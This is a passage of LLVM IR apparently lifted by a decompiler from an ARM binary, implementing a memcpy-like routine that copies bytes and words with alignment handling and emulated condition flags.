  store i1 %v10_19934, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_1992c, %bb138
  %v0_1993c.pre = phi i32 [ %v4_19934, %bb138 ], [ %v0_1993c.pre157, %dec_label_pc_1992c ]
  %v3_1993098115 = phi i32 [ %v12_19930, %bb138 ], [ %v3_19930, %dec_label_pc_1992c ]
  %v1_19938 = phi i1 [ %v8_19934, %bb138 ], [ %v1_19934, %dec_label_pc_1992c ]
  %v0_19938 = phi i1 [ %v9_19934, %bb138 ], [ %v0_19934, %dec_label_pc_1992c ]
  %v2_19938 = xor i1 %v1_19938, %v0_19938
  br i1 %v2_19938, label %dec_label_pc_1993c, label %dec_label_pc_1992c

dec_label_pc_1993c:                               ; preds = %.thread114, %dec_label_pc_198e8
  %v4_1994c = phi i32 [ %v0_1990093, %dec_label_pc_198e8 ], [ %v3_1993098115, %.thread114 ]
  %v0_1993c = phi i32 [ %v1_198e8, %dec_label_pc_198e8 ], [ %v0_1993c.pre, %.thread114 ]
  %v1_1993c = add i32 %v0_1993c, 8
  store i32 %v1_1993c, i32* %r2.global-to-local, align 4
  %v3_1993c = sub i32 0, %v0_1993c
  %v4_1993c = and i32 %v1_1993c, %v3_1993c
  %v5_1993c = icmp slt i32 %v4_1993c, 0
  store i1 %v5_1993c, i1* %cpsr_v.global-to-local, align 1
  %v6_1993c = icmp slt i32 %v1_1993c, 0
  store i1 %v6_1993c, i1* %cpsr_n.global-to-local, align 1
  %v7_1993c = icmp eq i32 %v1_1993c, 0
  store i1 %v7_1993c, i1* %cpsr_z.global-to-local, align 1
  %v2_19940 = xor i1 %v6_1993c, %v5_1993c
  br i1 %v2_19940, label %bb140, label %dec_label_pc_19944

dec_label_pc_19944:                               ; preds = %dec_label_pc_1993c
  %v1_19944 = add i32 %v0_1993c, 4
  store i32 %v1_19944, i32* %r2.global-to-local, align 4
  %v3_19944 = sub i32 -5, %v0_1993c
  %v4_19944 = and i32 %v3_19944, %v1_1993c
  %v5_19944 = icmp slt i32 %v4_19944, 0
  store i1 %v5_19944, i1* %cpsr_v.global-to-local, align 1
  %v6_19944 = icmp slt i32 %v1_19944, 0
  store i1 %v6_19944, i1* %cpsr_n.global-to-local, align 1
  %v7_19944 = icmp eq i32 %v1_1993c, 4
  store i1 %v7_19944, i1* %cpsr_z.global-to-local, align 1
  %v2_19948 = xor i1 %v6_19944, %v5_19944
  %v3_19948 = load i32, i32* %r1.global-to-local, align 4
  %v4_19948 = inttoptr i32 %v3_19948 to i32*
  %v5_19948 = load i32, i32* %v4_19948, align 4
  store i32 %v5_19948, i32* @r3, align 4
  %v7_19948 = add i32 %v3_19948, 4
  br i1 %v2_19948, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_19944
  store i32 %v7_19948, i32* %r1.global-to-local, align 4
  %v5_1994c = inttoptr i32 %v4_1994c to i32*
  store i32 %v5_19948, i32* %v5_1994c, align 4
  %v6_1994c = load i32, i32* %r0.global-to-local, align 4
  %v7_1994c = add i32 %v6_1994c, 4
  store i32 %v7_1994c, i32* %r0.global-to-local, align 4
  %v0_1995c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_19944
  %v7_19950 = inttoptr i32 %v7_19948 to i32*
  %v8_19950 = load i32, i32* %v7_19950, align 4
  store i32 %v8_19950, i32* @ip, align 4
  %v9_19950 = add i32 %v3_19948, 8
  store i32 %v9_19950, i32* %r1.global-to-local, align 4
  %v4_19954 = inttoptr i32 %v4_1994c to i32*
  store i32 %v5_19948, i32* %v4_19954, align 4
  %v6_19954 = add i32 %v4_1994c, 4
  %v7_19954 = inttoptr i32 %v6_19954 to i32*
  %v8_19954 = load i32, i32* @ip, align 4
  store i32 %v8_19954, i32* %v7_19954, align 4
  %v9_19954 = add i32 %v4_1994c, 8
  store i32 %v9_19954, i32* %r0.global-to-local, align 4
  %v3_19958 = load i32, i32* %r2.global-to-local, align 4
  %v4_19958 = add i32 %v3_19958, -4
  store i32 %v4_19958, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_1993c, %bb, %dec_label_pc_19b0c, %dec_label_pc_19aa0, %dec_label_pc_19a34, %bb139
  %v0_1995c = phi i32 [ %v0_1995c.pre, %.thread121 ], [ %v2_199ac, %.thread127 ], [ %v1_1993c, %dec_label_pc_1993c ], [ %v2_198d0, %bb ], [ %v0_1995c60, %dec_label_pc_19b0c ], [ %v0_1995c59, %dec_label_pc_19aa0 ], [ %v0_1995c58, %dec_label_pc_19a34 ], [ %v4_19958, %bb139 ]
  %v1_1995c = add i32 %v0_1995c, 4
  store i32 %v1_1995c, i32* %r2.global-to-local, align 4
  %v3_1995c = sub i32 0, %v0_1995c
  %v4_1995c = and i32 %v1_1995c, %v3_1995c
  %v5_1995c = icmp slt i32 %v4_1995c, 0
  store i1 %v5_1995c, i1* %cpsr_v.global-to-local, align 1
  %v6_1995c = icmp slt i32 %v1_1995c, 0
  store i1 %v6_1995c, i1* %cpsr_n.global-to-local, align 1
  %v7_1995c = icmp eq i32 %v1_1995c, 0
  store i1 %v7_1995c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1995c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_19964.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_19960 = load i8*, i8** %stack_var_-8, align 4
  %v4_19960 = ptrtoint i8* %v3_19960 to i32
  store i32 %v4_19960, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_19964 = phi i32 [ %v0_19964.pre, %bb140.bb142_crit_edge ], [ %v8_198cc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1995c, i32 %v0_19964)
  %v0_19968 = load i32, i32* %r2.global-to-local, align 4
  %v1_19968 = add i32 %v0_19968, -2
  %v3_19968 = sub i32 1, %v0_19968
  %v4_19968 = and i32 %v3_19968, %v0_19968
  %v5_19968 = icmp slt i32 %v4_19968, 0
  store i1 %v5_19968, i1* %cpsr_v.global-to-local, align 1
  %v6_19968 = icmp slt i32 %v1_19968, 0
  store i1 %v6_19968, i1* %cpsr_n.global-to-local, align 1
  %v7_19968 = icmp eq i32 %v0_19968, 2
  store i1 %v7_19968, i1* %cpsr_z.global-to-local, align 1
  %v0_1996c = load i32, i32* %r1.global-to-local, align 4
  %v1_1996c = inttoptr i32 %v0_1996c to i8*
  %v2_1996c = load i8, i8* %v1_1996c, align 1
  %v5_1996c = add i32 %v0_1996c, 1
  store i32 %v5_1996c, i32* %r1.global-to-local, align 4
  %v2_19970 = load i32, i32* %r0.global-to-local, align 4
  %v3_19970 = inttoptr i32 %v2_19970 to i8*
  store i8 %v2_1996c, i8* %v3_19970, align 1
  %v4_19970 = load i32, i32* %r0.global-to-local, align 4
  %v5_19970 = add i32 %v4_19970, 1
  store i32 %v5_19970, i32* %r0.global-to-local, align 4
  %v0_19974 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_19974 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_19974 = xor i1 %v0_19974, %v1_19974
  br i1 %v2_19974, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_19974 = load i32, i32* %r1.global-to-local, align 4
  %v4_19974 = inttoptr i32 %v3_19974 to i8*
  %v5_19974 = load i8, i8* %v4_19974, align 1
  %v8_19974 = add i32 %v3_19974, 1
  store i32 %v8_19974, i32* %r1.global-to-local, align 4
  %v6_19978 = inttoptr i32 %v5_19970 to i8*
  store i8 %v5_19974, i8* %v6_19978, align 1
  %v7_19978 = load i32, i32* %r0.global-to-local, align 4
  %v8_19978 = add i32 %v7_19978, 1
  store i32 %v8_19978, i32* %r0.global-to-local, align 4
  %v1_1997c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1997c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_19980 = phi i32 [ %v8_19978, %bb143 ], [ %v5_19970, %bb142 ]
  %v2_19980 = phi i1 [ %v2_1997c.pre, %bb143 ], [ %v1_19974, %bb142 ]
  %v1_19980 = phi i1 [ %v1_1997c.pre, %bb143 ], [ %v0_19974, %bb142 ]
  %v0_1997c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1997c = xor i1 %v2_19980, %v1_19980
  %v4_1997c = or i1 %v0_1997c, %v3_1997c
  br i1 %v4_1997c, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_1997c = load i32, i32* %r1.global-to-local, align 4
  %v6_1997c = inttoptr i32 %v5_1997c to i8*
  %v7_1997c = load i8, i8* %v6_1997c, align 1
  %v10_1997c = add i32 %v5_1997c, 1
  store i32 %v10_1997c, i32* %r1.global-to-local, align 4
  %v8_19980 = inttoptr i32 %v7_19980 to i8*
  store i8 %v7_1997c, i8* %v8_19980, align 1
  %v9_19980 = load i32, i32* %r0.global-to-local, align 4
  %v10_19980 = add i32 %v9_19980, 1
  store i32 %v10_19980, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_19984 = load i8*, i8** %stack_var_-8, align 4
  %v3_19984 = ptrtoint i8* %v2_19984 to i32
  store i32 %v3_19984, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_198cc)
  %v0_1998c.pre = load i32, i32* @ip, align 4
  %v0_19994.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_19998.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1998c

dec_label_pc_1998c:                               ; preds = %dec_label_pc_198d8, %.thread125
  %v2_19998 = phi i32 [ %v1_198c0, %dec_label_pc_198d8 ], [ %v2_19998.pre, %.thread125 ]
  %v0_19994 = phi i32 [ %v0_198c0, %dec_label_pc_198d8 ], [ %v0_19994.pre, %.thread125 ]
  %v0_1998c = phi i32 [ %v1_198d8, %dec_label_pc_198d8 ], [ %v0_1998c.pre, %.thread125 ]
  %v1_1998c = sub i32 4, %v0_1998c
  store i32 %v1_1998c, i32* @ip, align 4
  %v1_19990 = add i32 %v1_1998c, -2
  %v3_19990 = sub i32 1, %v1_1998c
  %v4_19990 = and i32 %v3_19990, %v1_1998c
  %v5_19990 = icmp slt i32 %v4_19990, 0
  store i1 %v5_19990, i1* %cpsr_v.global-to-local, align 1
  %v6_19990 = icmp slt i32 %v1_19990, 0
  store i1 %v6_19990, i1* %cpsr_n.global-to-local, align 1
  %v7_19990 = icmp eq i32 %v1_1998c, 2
  store i1 %v7_19990, i1* %cpsr_z.global-to-local, align 1
  %v1_19994 = inttoptr i32 %v0_19994 to i8*
  %v2_19994 = load i8, i8* %v1_19994, align 1
  %v3_19994 = zext i8 %v2_19994 to i32
  store i32 %v3_19994, i32* @r3, align 4
  %v5_19994 = add i32 %v0_19994, 1
  store i32 %v5_19994, i32* %r1.global-to-local, align 4
  %v3_19998 = inttoptr i32 %v2_19998 to i8*
  store i8 %v2_19994, i8* %v3_19998, align 1
  %v4_19998 = load i32, i32* %r0.global-to-local, align 4
  %v5_19998 = add i32 %v4_19998, 1
  store i32 %v5_19998, i32* %r0.global-to-local, align 4
  %v0_1999c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1999c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1999c = xor i1 %v0_1999c, %v1_1999c
  br i1 %v2_1999c, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_1998c
  %v3_1999c = load i32, i32* %r1.global-to-local, align 4
  %v4_1999c = inttoptr i32 %v3_1999c to i8*
  %v5_1999c = load i8, i8* %v4_1999c, align 1
  %v6_1999c = zext i8 %v5_1999c to i32
  store i32 %v6_1999c, i32* @r3, align 4
  %v8_1999c = add i32 %v3_1999c, 1
  store i32 %v8_1999c, i32* %r1.global-to-local, align 4
  %v6_199a0 = inttoptr i32 %v5_19998 to i8*
  store i8 %v5_1999c, i8* %v6_199a0, align 1
  %v7_199a0 = load i32, i32* %r0.global-to-local, align 4
  %v8_199a0 = add i32 %v7_199a0, 1
  store i32 %v8_199a0, i32* %r0.global-to-local, align 4
  %v1_199a4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_199a4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_1998c, %bb145
  %v7_199a8 = phi i32 [ %v8_199a0, %bb145 ], [ %v5_19998, %dec_label_pc_1998c ]
  %v2_199a8 = phi i1 [ %v2_199a4.pre, %bb145 ], [ %v1_1999c, %dec_label_pc_1998c ]
  %v1_199a8 = phi i1 [ %v1_199a4.pre, %bb145 ], [ %v0_1999c, %dec_label_pc_1998c ]
  %v0_199a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_199a4 = xor i1 %v2_199a8, %v1_199a8
  %v4_199a4 = or i1 %v0_199a4, %v3_199a4
  br i1 %v4_199a4, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_199a4 = load i32, i32* %r1.global-to-local, align 4
  %v6_199a4 = inttoptr i32 %v5_199a4 to i8*
  %v7_199a4 = load i8, i8* %v6_199a4, align 1
  %v8_199a4 = zext i8 %v7_199a4 to i32
  store i32 %v8_199a4, i32* @r3, align 4
  %v10_199a4 = add i32 %v5_199a4, 1
  store i32 %v10_199a4, i32* %r1.global-to-local, align 4
  %v8_199a8 = inttoptr i32 %v7_199a8 to i8*
  store i8 %v7_199a4, i8* %v8_199a8, align 1
  %v9_199a8 = load i32, i32* %r0.global-to-local, align 4
  %v10_199a8 = add i32 %v9_199a8, 1
  store i32 %v10_199a8, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_19adc76 = phi i32 [ %v10_199a8, %bb146 ], [ %v7_199a8, %.thread126 ]
  %v0_199ac = load i32, i32* %r2.global-to-local, align 4
  %v1_199ac = load i32, i32* @ip, align 4
  %v2_199ac = sub i32 %v0_199ac, %v1_199ac
  store i32 %v2_199ac, i32* %r2.global-to-local, align 4
  %v4_199ac = xor i32 %v1_199ac, %v0_199ac
  %v5_199ac = xor i32 %v2_199ac, %v0_199ac
  %v6_199ac = and i32 %v5_199ac, %v4_199ac
  %v7_199ac = icmp slt i32 %v6_199ac, 0
  store i1 %v7_199ac, i1* %cpsr_v.global-to-local, align 1
  %v8_199ac = icmp slt i32 %v2_199ac, 0
  store i1 %v8_199ac, i1* %cpsr_n.global-to-local, align 1
  %v9_199ac = icmp eq i32 %v0_199ac, %v1_199ac
  store i1 %v9_199ac, i1* %cpsr_z.global-to-local, align 1
  %v2_199b0 = xor i1 %v8_199ac, %v7_199ac
  br i1 %v2_199b0, label %bb140, label %dec_label_pc_199b4

dec_label_pc_199b4:                               ; preds = %.thread127
  %v0_199b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_199b4 = urem i32 %v0_199b4, 4
  store i32 %v1_199b4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_199b4 = icmp eq i32 %v1_199b4, 0
  store i1 %v2_199b4, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_199b4 to i2
  br i1 %v2_199b4, label %dec_label_pc_198e8, label %dec_label_pc_199bc

dec_label_pc_199bc:                               ; preds = %dec_label_pc_198e0, %dec_label_pc_199b4
  %v0_19adc75 = phi i32 [ %v1_198c0, %dec_label_pc_198e0 ], [ %v0_19adc76, %dec_label_pc_199b4 ]
  %v0_19a44 = phi i32 [ %v2_198d0, %dec_label_pc_198e0 ], [ %v2_199ac, %dec_label_pc_199b4 ]
  %v0_199c4.off0 = phi i2 [ %extract.t, %dec_label_pc_198e0 ], [ %extract.t130, %dec_label_pc_199b4 ]
  %v0_199bc = phi i32 [ %v0_198c0, %dec_label_pc_198e0 ], [ %v0_199b4, %dec_label_pc_199b4 ]
  %v1_199bc = and i32 %v0_199bc, -4
  store i32 %v1_199bc, i32* %r1.global-to-local, align 4
  %v1_199c0 = inttoptr i32 %v1_199bc to i32*
  %v2_199c0 = load i32, i32* %v1_199c0, align 4
  store i32 %v2_199c0, i32* %lr.global-to-local, align 4
  %v4_199c0 = add i32 %v1_199bc, 4
  store i32 %v4_199c0, i32* %r1.global-to-local, align 4
  %v1_19a3c = add i32 %v0_19a44, -12
  %v3_19a3c = sub i32 11, %v0_19a44
  %v4_19a3c = and i32 %v3_19a3c, %v0_19a44
  %v5_19a3c = icmp slt i32 %v4_19a3c, 0
  store i1 %v5_19a3c, i1* %cpsr_v.global-to-local, align 1
  %v6_19a3c = icmp slt i32 %v1_19a3c, 0
  store i1 %v6_19a3c, i1* %cpsr_n.global-to-local, align 1
  %v7_19a3c = icmp eq i32 %v0_19a44, 12
  store i1 %v7_19a3c, i1* %cpsr_z.global-to-local, align 1
  %v2_19a40 = xor i1 %v6_19a3c, %v5_19a3c
  switch i2 %v0_199c4.off0, label %dec_label_pc_199d0 [
    i2 -1, label %dec_label_pc_19aa8
    i2 -2, label %dec_label_pc_19a3c
  ]

dec_label_pc_199d0:                               ; preds = %dec_label_pc_199bc
  br i1 %v2_19a40, label %dec_label_pc_19a1c, label %dec_label_pc_199d8

dec_label_pc_199d8:                               ; preds = %dec_label_pc_199d0
  store i32 %v1_19a3c, i32* %r2.global-to-local, align 4
  %v3_199dc = load i32, i32* @r4, align 4
  store i32 %v3_199dc, i32* %stack_var_-16, align 4
  %v6_199dc = load i32, i32* @r5, align 4
  store i32 %v6_199dc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_199e0

dec_label_pc_199e0:                               ; preds = %dec_label_pc_199e0.dec_label_pc_199e0_crit_edge, %dec_label_pc_199d8
  %v0_19a04 = phi i32 [ %v12_19a04, %dec_label_pc_199e0.dec_label_pc_199e0_crit_edge ], [ %v0_19adc75, %dec_label_pc_199d8 ]
  %v0_199e4 = phi i32 [ %v0_199e4.pre, %dec_label_pc_199e0.dec_label_pc_199e0_crit_edge ], [ %v4_199c0, %dec_label_pc_199d8 ]
  %v0_199e0 = phi i32 [ %v0_199e0.pre, %dec_label_pc_199e0.dec_label_pc_199e0_crit_edge ], [ %v2_199c0, %dec_label_pc_199d8 ]
  %v3_199e0 = udiv i32 %v0_199e0, 256
  %v1_199e4 = inttoptr i32 %v0_199e4 to i32*
  %v2_199e4 = load i32, i32* %v1_199e4, align 4
  store i32 %v2_199e4, i32* %r4.global-to-local, align 4
  %v3_199e4 = add i32 %v0_199e4, 4
  %v4_199e4 = inttoptr i32 %v3_199e4 to i32*
  %v5_199e4 = load i32, i32* %v4_199e4, align 4
  store i32 %v5_199e4, i32* %r5.global-to-local, align 4
  %v6_199e4 = add i32 %v0_199e4, 8
  %v7_199e4 = inttoptr i32 %v6_199e4 to i32*
  %v8_199e4 = load i32, i32* %v7_199e4, align 4
  store i32 %v8_199e4, i32* %ip.global-to-local, align 4
  %v9_199e4 = add i32 %v0_199e4, 12
  %v10_199e4 = inttoptr i32 %v9_199e4 to i32*
  %v11_199e4 = load i32, i32* %v10_199e4, align 4
  store i32 %v11_199e4, i32* %lr.global-to-local, align 4
  %v12_199e4 = add i32 %v0_199e4, 16
  store i32 %v12_199e4, i32* %r1.global-to-local, align 4
  %v4_199e8 = mul i32 %v2_199e4, 16777216
  %v5_199e8 = or i32 %v4_199e8, %v3_199e0
  store i32 %v5_199e8, i32* @r3, align 4
  %v3_199ec = udiv i32 %v2_199e4, 256
  %v4_199f0 = mul i32 %v5_199e4, 16777216
  %v5_199f0 = or i32 %v4_199f0, %v3_199ec
  store i32 %v5_199f0, i32* %r4.global-to-local, align 4
  %v3_199f4 = udiv i32 %v5_199e4, 256
  %v4_199f8 = mul i32 %v8_199e4, 16777216
  %v5_199f8 = or i32 %v4_199f8, %v3_199f4
  store i32 %v5_199f8, i32* %r5.global-to-local, align 4
  %v3_199fc = udiv i32 %v8_199e4, 256
  %v4_19a00 = mul i32 %v11_199e4, 16777216
  %v5_19a00 = or i32 %v4_19a00, %v3_199fc
  store i32 %v5_19a00, i32* @ip, align 4
  %v1_19a04 = inttoptr i32 %v0_19a04 to i32*
  store i32 %v5_199e8, i32* %v1_19a04, align 4
  %v3_19a04 = add i32 %v0_19a04, 4
  %v4_19a04 = inttoptr i32 %v3_19a04 to i32*
  %v5_19a04 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19a04, i32* %v4_19a04, align 4
  %v6_19a04 = add i32 %v0_19a04, 8
  %v7_19a04 = inttoptr i32 %v6_19a04 to i32*
  %v8_19a04 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_19a04, i32* %v7_19a04, align 4
  %v9_19a04 = add i32 %v0_19a04, 12
  %v10_19a04 = inttoptr i32 %v9_19a04 to i32*
  %v11_19a04 = load i32, i32* @ip, align 4
  store i32 %v11_19a04, i32* %v10_19a04, align 4
  %v12_19a04 = add i32 %v0_19a04, 16
  store i32 %v12_19a04, i32* %r0.global-to-local, align 4
  %v0_19a08 = load i32, i32* %r2.global-to-local, align 4
  %v1_19a08 = add i32 %v0_19a08, -16
  store i32 %v1_19a08, i32* %r2.global-to-local, align 4
  %v3_19a08 = sub i32 15, %v0_19a08
  %v4_19a08 = and i32 %v3_19a08, %v0_19a08
  %v5_19a08 = icmp slt i32 %v4_19a08, 0
  %v6_19a08 = icmp slt i32 %v1_19a08, 0
  %v2_19a0c = xor i1 %v6_19a08, %v5_19a08
  br i1 %v2_19a0c, label %dec_label_pc_19a10, label %dec_label_pc_199e0.dec_label_pc_199e0_crit_edge

dec_label_pc_199e0.dec_label_pc_199e0_crit_edge:  ; preds = %dec_label_pc_199e0
  %v0_199e0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_199e4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_199e0

dec_label_pc_19a10:                               ; preds = %dec_label_pc_199e0
  %v2_19a10 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19a10, i32* @r4, align 4
  %v5_19a10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_19a10, i32* @r5, align 4
  %v1_19a14 = add i32 %v0_19a08, -4
  store i32 %v1_19a14, i32* %r2.global-to-local, align 4
  %v3_19a14 = add i32 %v0_19a08, 2147483632
  %v4_19a14 = and i32 %v1_19a14, %v3_19a14
  %v5_19a14 = icmp slt i32 %v4_19a14, 0
  store i1 %v5_19a14, i1* %cpsr_v.global-to-local, align 1
  %v6_19a14 = icmp slt i32 %v1_19a14, 0
  store i1 %v6_19a14, i1* %cpsr_n.global-to-local, align 1
  %v7_19a14 = icmp eq i32 %v1_19a14, 0
  store i1 %v7_19a14, i1* %cpsr_z.global-to-local, align 1
  %v2_19a18 = xor i1 %v6_19a14, %v5_19a14
  br i1 %v2_19a18, label %dec_label_pc_19a34, label %dec_label_pc_19a1c

dec_label_pc_19a1c:                               ; preds = %dec_label_pc_19a10, %dec_label_pc_199d0, %dec_label_pc_19a1c
  %v1_19a28 = phi i32 [ %v4_19a28, %dec_label_pc_19a1c ], [ %v12_19a04, %dec_label_pc_19a10 ], [ %v0_19adc75, %dec_label_pc_199d0 ]
  %v0_19a1c = load i32, i32* %lr.global-to-local, align 4
  %v3_19a1c = udiv i32 %v0_19a1c, 256
  store i32 %v3_19a1c, i32* %ip.global-to-local, align 4
  %v0_19a20 = load i32, i32* %r1.global-to-local, align 4
  %v1_19a20 = inttoptr i32 %v0_19a20 to i32*
  %v2_19a20 = load i32, i32* %v1_19a20, align 4
  store i32 %v2_19a20, i32* %lr.global-to-local, align 4
  %v4_19a20 = add i32 %v0_19a20, 4
  store i32 %v4_19a20, i32* %r1.global-to-local, align 4
  %v4_19a24 = mul i32 %v2_19a20, 16777216
  %v5_19a24 = or i32 %v4_19a24, %v3_19a1c
  store i32 %v5_19a24, i32* @ip, align 4
  %v2_19a28 = inttoptr i32 %v1_19a28 to i32*
  store i32 %v5_19a24, i32* %v2_19a28, align 4
  %v3_19a28 = load i32, i32* %r0.global-to-local, align 4
  %v4_19a28 = add i32 %v3_19a28, 4
  store i32 %v4_19a28, i32* %r0.global-to-local, align 4
  %v0_19a2c = load i32, i32* %r2.global-to-local, align 4
  %v1_19a2c = add i32 %v0_19a2c, -4
  store i32 %v1_19a2c, i32* %r2.global-to-local, align 4
  %v3_19a2c = sub i32 3, %v0_19a2c
  %v4_19a2c = and i32 %v3_19a2c, %v0_19a2c
  %v5_19a2c = icmp slt i32 %v4_19a2c, 0
  %v6_19a2c = icmp slt i32 %v1_19a2c, 0
  %v2_19a30 = xor i1 %v6_19a2c, %v5_19a2c
  br i1 %v2_19a30, label %dec_label_pc_19a34.loopexit, label %dec_label_pc_19a1c

dec_label_pc_19a34.loopexit:                      ; preds = %dec_label_pc_19a1c
  %v7_19a2c = icmp eq i32 %v0_19a2c, 4
  store i1 %v5_19a2c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_19a2c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_19a2c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19a34

dec_label_pc_19a34:                               ; preds = %dec_label_pc_19a34.loopexit, %dec_label_pc_19a10
  %v0_1995c58 = phi i32 [ %v1_19a2c, %dec_label_pc_19a34.loopexit ], [ %v1_19a14, %dec_label_pc_19a10 ]
  %v0_19a34 = load i32, i32* %r1.global-to-local, align 4
  %v1_19a34 = add i32 %v0_19a34, -3
  store i32 %v1_19a34, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_19a3c:                               ; preds = %dec_label_pc_199bc
  br i1 %v2_19a40, label %dec_label_pc_19a88, label %dec_label_pc_19a44

dec_label_pc_19a44:                               ; preds = %dec_label_pc_19a3c
  store i32 %v1_19a3c, i32* %r2.global-to-local, align 4
  %v3_19a48 = load i32, i32* @r4, align 4
  store i32 %v3_19a48, i32* %stack_var_-16, align 4
  %v6_19a48 = load i32, i32* @r5, align 4
  store i32 %v6_19a48, i32* %stack_var_-12, align 4
  br label %dec_label_pc_19a4c

dec_label_pc_19a4c:                               ; preds = %dec_label_pc_19a4c.dec_label_pc_19a4c_crit_edge, %dec_label_pc_19a44
  %v0_19a70 = phi i32 [ %v12_19a70, %dec_label_pc_19a4c.dec_label_pc_19a4c_crit_edge ], [ %v0_19adc75, %dec_label_pc_19a44 ]
  %v0_19a50 = phi i32 [ %v0_19a50.pre, %dec_label_pc_19a4c.dec_label_pc_19a4c_crit_edge ], [ %v4_199c0, %dec_label_pc_19a44 ]
  %v0_19a4c = phi i32 [ %v0_19a4c.pre, %dec_label_pc_19a4c.dec_label_pc_19a4c_crit_edge ], [ %v2_199c0, %dec_label_pc_19a44 ]
  %v3_19a4c = udiv i32 %v0_19a4c, 65536
  %v1_19a50 = inttoptr i32 %v0_19a50 to i32*
  %v2_19a50 = load i32, i32* %v1_19a50, align 4
  store i32 %v2_19a50, i32* %r4.global-to-local, align 4
  %v3_19a50 = add i32 %v0_19a50, 4
  %v4_19a50 = inttoptr i32 %v3_19a50 to i32*
  %v5_19a50 = load i32, i32* %v4_19a50, align 4
  store i32 %v5_19a50, i32* %r5.global-to-local, align 4
  %v6_19a50 = add i32 %v0_19a50, 8
  %v7_19a50 = inttoptr i32 %v6_19a50 to i32*
  %v8_19a50 = load i32, i32* %v7_19a50, align 4
  store i32 %v8_19a50, i32* %ip.global-to-local, align 4
  %v9_19a50 = add i32 %v0_19a50, 12
  %v10_19a50 = inttoptr i32 %v9_19a50 to i32*
  %v11_19a50 = load i32, i32* %v10_19a50, align 4
  store i32 %v11_19a50, i32* %lr.global-to-local, align 4
  %v12_19a50 = add i32 %v0_19a50, 16
  store i32 %v12_19a50, i32* %r1.global-to-local, align 4
  %v4_19a54 = mul i32 %v2_19a50, 65536
  %v5_19a54 = or i32 %v4_19a54, %v3_19a4c
  store i32 %v5_19a54, i32* @r3, align 4
  %v3_19a58 = udiv i32 %v2_19a50, 65536
  %v4_19a5c = mul i32 %v5_19a50, 65536
  %v5_19a5c = or i32 %v4_19a5c, %v3_19a58
  store i32 %v5_19a5c, i32* %r4.global-to-local, align 4
  %v3_19a60 = udiv i32 %v5_19a50, 65536
  %v4_19a64 = mul i32 %v8_19a50, 65536
  %v5_19a64 = or i32 %v4_19a64, %v3_19a60
  store i32 %v5_19a64, i32* %r5.global-to-local, align 4
  %v3_19a68 = udiv i32 %v8_19a50, 65536
  %v4_19a6c = mul i32 %v11_19a50, 65536
  %v5_19a6c = or i32 %v4_19a6c, %v3_19a68
  store i32 %v5_19a6c, i32* @ip, align 4
  %v1_19a70 = inttoptr i32 %v0_19a70 to i32*
  store i32 %v5_19a54, i32* %v1_19a70, align 4
  %v3_19a70 = add i32 %v0_19a70, 4
  %v4_19a70 = inttoptr i32 %v3_19a70 to i32*
  %v5_19a70 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19a70, i32* %v4_19a70, align 4
  %v6_19a70 = add i32 %v0_19a70, 8
  %v7_19a70 = inttoptr i32 %v6_19a70 to i32*
  %v8_19a70 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_19a70, i32* %v7_19a70, align 4
  %v9_19a70 = add i32 %v0_19a70, 12
  %v10_19a70 = inttoptr i32 %v9_19a70 to i32*
  %v11_19a70 = load i32, i32* @ip, align 4
  store i32 %v11_19a70, i32* %v10_19a70, align 4
  %v12_19a70 = add i32 %v0_19a70, 16
  store i32 %v12_19a70, i32* %r0.global-to-local, align 4
  %v0_19a74 = load i32, i32* %r2.global-to-local, align 4
  %v1_19a74 = add i32 %v0_19a74, -16
  store i32 %v1_19a74, i32* %r2.global-to-local, align 4
